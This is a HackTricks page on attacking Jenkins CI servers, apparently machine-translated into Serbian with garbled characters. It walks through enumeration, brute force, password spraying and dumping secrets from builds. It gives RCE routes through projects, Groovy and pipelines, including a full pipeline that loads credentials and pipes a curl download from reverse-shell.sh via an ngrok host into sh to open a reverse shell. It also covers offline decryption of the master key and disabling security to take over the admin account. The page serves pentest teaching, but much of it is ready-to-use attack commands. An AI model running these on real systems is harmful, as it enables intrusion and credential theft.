# Jenkins Security

{% hint style="success" %}
NauÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne Informacije

Jenkins je alat koji nudi jednostavan metod za uspostavljanje okruÅ¾enja za **kontinuiranu integraciju** ili **kontinuiranu isporuku** (CI/CD) za gotovo **bilo koju** kombinaciju **programskih jezika** i repozitorijuma izvornog koda koristeÄ‡i pipelines. Pored toga, automatizuje razne rutinske razvojne zadatke. Iako Jenkins ne eliminiÅ¡e **potrebu za kreiranjem skripti za pojedinaÄne korake**, pruÅ¾a brÅ¾i i robusniji naÄin za integraciju celokupnog niza alata za izgradnju, testiranje i implementaciju nego Å¡to se to moÅ¾e lako konstruisati ruÄno.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Neautentifikovana Enumeracija

Da biste pretraÅ¾ivali zanimljive Jenkins stranice bez autentifikacije kao Å¡to su (_/people_ ili _/asynchPeople_, ovo prikazuje trenutne korisnike) moÅ¾ete koristiti:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Proverite da li moÅ¾ete izvrÅ¡avati komande bez potrebe za autentifikacijom:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Bez kredencijala moÅ¾ete pogledati unutar _**/asynchPeople/**_ putanje ili _**/securityRealm/user/admin/search/index?q=**_ za **korisniÄka imena**.

MoÅ¾ete dobiti verziju Jenkins-a iz putanje _**/oops**_ ili _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Poznate ranjivosti

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Prijava

U osnovnim informacijama moÅ¾ete proveriti **sve naÄine za prijavu u Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registracija

MoÄ‡i Ä‡ete pronaÄ‡i Jenkins instance koje **dozvoljavaju kreiranje naloga i prijavu unutar njih. Tako jednostavno.**

### **SSO Prijava**

TakoÄ‘e, ako su prisutne **SSO** **funkcionalnosti**/**dodaci**, trebali biste pokuÅ¡ati da se **prijavite** u aplikaciju koristeÄ‡i test nalog (npr. test **Github/Bitbucket nalog**). Trik sa [**ovog mesta**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** nema **politiku lozinki** i **mitigaciju brute-force napada na korisniÄka imena**. VaÅ¾no je **izvrÅ¡iti brute-force** na korisnike jer mogu biti u upotrebi **slabe lozinke** ili **korisniÄka imena kao lozinke**, Äak i **obrnuta korisniÄka imena kao lozinke**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Koristite [ovaj python skript](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ili [ovaj powershell skript](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Mnoge organizacije kombinuju **SaaS-based source control management (SCM) sisteme** kao Å¡to su GitHub ili GitLab sa **internim, self-hosted CI** reÅ¡enjem kao Å¡to su Jenkins ili TeamCity. Ova postavka omoguÄ‡ava CI sistemima da **primaju webhook dogaÄ‘aje od SaaS source control vendora**, prvenstveno za pokretanje pipeline poslova.

Da bi to postigli, organizacije **whitelistuju** **IP opsege** **SCM platformi**, dozvoljavajuÄ‡i im pristup **internom CI sistemu** putem **webhookova**. MeÄ‘utim, vaÅ¾no je napomenuti da **bilo ko** moÅ¾e kreirati **nalog** na GitHub-u ili GitLab-u i konfigurisati ga da **pokreÄ‡e webhook**, potencijalno Å¡aljuÄ‡i zahteve ka **internom CI sistemu**.

Proverite: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

U ovim scenarijima pretpostavljamo da imate vaÅ¾eÄ‡i nalog za pristup Jenkins-u.

{% hint style="warning" %}
U zavisnosti od **Authorization** mehanizma konfigurisanog u Jenkins-u i dozvola kompromitovanog korisnika, **moÅ¾da Ä‡ete moÄ‡i ili neÄ‡ete moÄ‡i da izvedete sledeÄ‡e napade.**
{% endhint %}

Za viÅ¡e informacija proverite osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

Ako ste pristupili Jenkins-u, moÅ¾ete listati druge registrovane korisnike na [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds to find cleartext secrets

Koristite [ovaj skript](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) da dump-ujete izlaze konzole build-ova i build promenljive okruÅ¾enja kako biste eventualno pronaÅ¡li tajne u Äistom tekstu.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **KraÄ‘a SSH akreditiva**

Ako kompromitovani korisnik ima **dovoljno privilegija da kreira/modifikuje novi Jenkins Ävor** i SSH akreditivi su veÄ‡ saÄuvani za pristup drugim Ävorovima, on bi mogao **ukrasti te akreditive** kreiranjem/modifikovanjem Ävora i **postavljanjem hosta koji Ä‡e beleÅ¾iti akreditive** bez verifikacije kljuÄa hosta:

![](<../../.gitbook/assets/image (218).png>)

ObiÄno Ä‡ete naÄ‡i Jenkins ssh akreditive u **globalnom provajderu** (`/credentials/`), tako da ih moÅ¾ete dump-ovati kao i bilo koju drugu tajnu. ViÅ¡e informacija u [**Dumping secrets section**](./#dumping-secrets).

### **RCE u Jenkins-u**

Dobijanje **Å¡koljke na Jenkins serveru** daje napadaÄu priliku da otkrije sve **tajne** i **env varijable** i da **eksploatiÅ¡e druge maÅ¡ine** koje se nalaze u istoj mreÅ¾i ili Äak **prikupi cloud akreditive**.

Podrazumevano, Jenkins Ä‡e **raditi kao SYSTEM**. Dakle, kompromitovanje Ä‡e napadaÄu dati **SYSTEM privilegije**.

### **RCE Kreiranjem/Modifikovanjem projekta**

Kreiranje/Modifikovanje projekta je naÄin da se dobije RCE nad Jenkins serverom:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE IzvrÅ¡avanjem Groovy skripte**

TakoÄ‘e moÅ¾ete dobiti RCE izvrÅ¡avanjem Groovy skripte, Å¡to moÅ¾e biti diskretnije od kreiranja novog projekta:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Kreiranjem/Modifikovanjem Pipeline-a

TakoÄ‘e moÅ¾ete dobiti **RCE kreiranjem/modifikovanjem pipeline-a**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Eksploatacija Pipeline-a

Da biste eksploatisali pipeline-e, i dalje morate imati pristup Jenkins-u.

### Build Pipelines

**Pipelines** se takoÄ‘e mogu koristiti kao **mehanizam za build u projektima**, u tom sluÄaju moÅ¾e biti konfigurisan **fajl unutar repozitorijuma** koji Ä‡e sadrÅ¾ati sintaksu pipeline-a. Podrazumevano se koristi `/Jenkinsfile`:

![](<../../.gitbook/assets/image (127).png>)

TakoÄ‘e je moguÄ‡e **Äuvati konfiguracione fajlove pipeline-a na drugim mestima** (na primer u drugim repozitorijumima) sa ciljem **odvajanja** pristupa repozitorijumu i pristupa pipeline-u.

Ako napadaÄ ima **pristup za pisanje nad tim fajlom**, moÄ‡i Ä‡e da ga **modifikuje** i **potencijalno pokrene** pipeline bez Äak i pristupa Jenkins-u.\
MoguÄ‡e je da Ä‡e napadaÄ morati da **zaobiÄ‘e neke zaÅ¡tite grana** (u zavisnosti od platforme i korisniÄkih privilegija, one bi mogle biti zaobiÄ‘ene ili ne).

NajÄeÅ¡Ä‡i okidaÄi za izvrÅ¡avanje prilagoÄ‘enog pipeline-a su:

* **Pull request** na glavnu granu (ili potencijalno na druge grane)
* **Push na glavnu granu** (ili potencijalno na druge grane)
* **AÅ¾uriranje glavne grane** i Äekanje da se nekako izvrÅ¡i

{% hint style="info" %}
Ako ste **spoljni korisnik**, ne biste trebali oÄekivati da kreirate **PR na glavnu granu** repozitorijuma **drugog korisnika/organizacije** i **pokrenete pipeline**... ali ako je **loÅ¡e konfigurisan** mogli biste potpuno **kompromitovati kompanije samo eksploatiÅ¡uÄ‡i ovo**.
{% endhint %}

### Pipeline RCE

U prethodnom RCE odeljku veÄ‡ je navedena tehnika za [**dobijanje RCE modifikovanjem pipeline-a**](./#rce-creating-modifying-pipeline).

### Provera Env varijabli

MoguÄ‡e je deklarisati **env varijable u Äistom tekstu** za ceo pipeline ili za specifiÄne faze. Ove env varijable **ne bi trebalo da sadrÅ¾e osetljive informacije**, ali napadaÄ uvek moÅ¾e **proveriti sve konfiguracije pipeline-a/Jenkinsfile-ove**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Ispisivanje tajni

Za informacije o tome kako se tajne obiÄno tretiraju u Jenkins-u, pogledajte osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Kredencijali mogu biti **rasporeÄ‘eni na globalne provajdere** (`/credentials/`) ili na **specifiÄne projekte** (`/job/<project-name>/configure`). Dakle, da biste ih sve eksfiltrirali, potrebno je da **kompromitujete bar sve projekte** koji sadrÅ¾e tajne i izvrÅ¡ite prilagoÄ‘ene/zatrovane pipeline-ove.

Postoji joÅ¡ jedan problem, da biste dobili **tajnu unutar env** pipeline-a, potrebno je da **znate ime i tip tajne**. Na primer, ako pokuÅ¡ate da **uÄitate** **`usernamePassword`** **tajnu** kao **`string`** **tajnu**, dobiÄ‡ete ovu **greÅ¡ku**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Evo naÄina za uÄitavanje nekih uobiÄajenih tipova tajni:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Na kraju ove stranice moÅ¾ete **pronaÄ‡i sve tipove kredencijala**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Najbolji naÄin da **izvuÄete sve tajne odjednom** je **kompromitovanjem** **Jenkins** maÅ¡ine (pokretanjem reverse shell-a na **ugraÄ‘enom Ävoru**, na primer) i zatim **curenjem** **master kljuÄeva** i **Å¡ifrovanih tajni** i deÅ¡ifrovanjem istih offline.\
ViÅ¡e o tome kako to uraditi u [sekciji Nodes & Agents](./#nodes-and-agents) i u [sekciji Post Exploitation](./#post-exploitation).
{% endhint %}

### Triggers

Iz [dokumentacije](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): Direktiva `triggers` definiÅ¡e **automatske naÄine na koje bi Pipeline trebalo ponovo pokrenuti**. Za Pipeline-ove koji su integrisani sa izvorom kao Å¡to su GitHub ili BitBucket, `triggers` moÅ¾da neÄ‡e biti potrebni jer Ä‡e integracija zasnovana na webhooks-ima verovatno veÄ‡ biti prisutna. Trenutno dostupni trigeri su `cron`, `pollSCM` i `upstream`.

Primer za Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **other examples in the docs**.

### Nodes & Agents

**Jenkins instance** moÅ¾e imati **razliÄite agente koji rade na razliÄitim maÅ¡inama**. Iz perspektive napadaÄa, pristup razliÄitim maÅ¡inama znaÄi **razliÄite potencijalne cloud kredencijale** za kraÄ‘u ili **razliÄit mreÅ¾ni pristup** koji moÅ¾e biti zloupotrebljen za eksploataciju drugih maÅ¡ina.

Za viÅ¡e informacija pogledajte osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

MoÅ¾ete enumerisati **konfigurisane nodove** na `/computer/`, obiÄno Ä‡ete naÄ‡i **`Built-In Node`** (koji je nod na kojem radi Jenkins) i potencijalno viÅ¡e:

![](<../../.gitbook/assets/image (249).png>)

**Posebno je interesantno kompromitovati Built-In nod** jer sadrÅ¾i osetljive Jenkins informacije.

Da biste naznaÄili da Å¾elite **pokrenuti** **pipeline** na **built-in Jenkins nodu**, moÅ¾ete specificirati sledeÄ‡u konfiguraciju unutar pipeline-a:
```bash
pipeline {
agent {label 'built-in'}
```
### Potpuni primer

Pipeline u specifiÄnom agentu, sa cron okidaÄem, sa pipeline i stage promenljivama okruÅ¾enja, uÄitavanje 2 promenljive u koraku i slanje reverse shell-a:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Tajne

MoÅ¾ete navesti tajne pristupajuÄ‡i `/credentials/` ako imate dovoljno dozvola. Imajte na umu da Ä‡e ovo samo navesti tajne unutar `credentials.xml` fajla, ali **fajlovi konfiguracije build-a** mogu takoÄ‘e imati **viÅ¡e kredencijala**.

Ako moÅ¾ete **videti konfiguraciju svakog projekta**, moÅ¾ete takoÄ‘e videti i **imena kredencijala (tajni)** koji se koriste za pristup repozitorijumu i **druge kredencijale projekta**.

![](<../../.gitbook/assets/image (180).png>)

#### Iz Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Sa diska

Ovi fajlovi su potrebni za **deÅ¡ifrovanje Jenkins tajni**:

* secrets/master.key
* secrets/hudson.util.Secret

Takve **tajne se obiÄno mogu naÄ‡i u**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Evo regex-a da ih pronaÄ‘ete:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

Ako ste preuzeli **potrebne lozinke za deÅ¡ifrovanje tajni**, koristite [**ovaj skript**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **da deÅ¡ifrujete te tajne**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### DeÅ¡ifrovanje Jenkins tajni iz Groovy-a
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Kreiraj novog admin korisnika

1. Pristupite Jenkins config.xml fajlu u `/var/lib/jenkins/config.xml` ili `C:\Program Files (x86)\Jenkins\`
2. PotraÅ¾ite reÄ `<useSecurity>true</useSecurity>` i promenite reÄ **`true`** u **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Restartujte** **Jenkins** server: `service jenkins restart`
4. Sada ponovo idite na Jenkins portal i **Jenkins neÄ‡e traÅ¾iti nikakve kredencijale** ovaj put. Idite na "**Manage Jenkins**" da ponovo postavite **administrator lozinku**.
5. **OmoguÄ‡ite** **sigurnost** ponovo promenom podeÅ¡avanja na `<useSecurity>true</useSecurity>` i **restartujte Jenkins ponovo**.

## Reference

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
NauÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
